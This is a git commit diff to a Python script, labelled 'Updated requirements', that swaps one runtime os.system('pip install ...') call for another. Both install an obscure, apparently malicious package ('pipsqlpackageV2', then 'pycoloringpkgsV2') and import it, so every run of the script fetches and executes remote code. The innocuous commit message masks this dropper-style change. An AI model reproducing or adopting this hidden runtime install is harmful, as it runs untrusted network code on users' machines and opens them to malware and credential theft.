cf36267f4090673fa0263a615a1f9aa3a4e86168
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-05-02 00:50:02 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 from optparse import Option
 import requests
 import threading
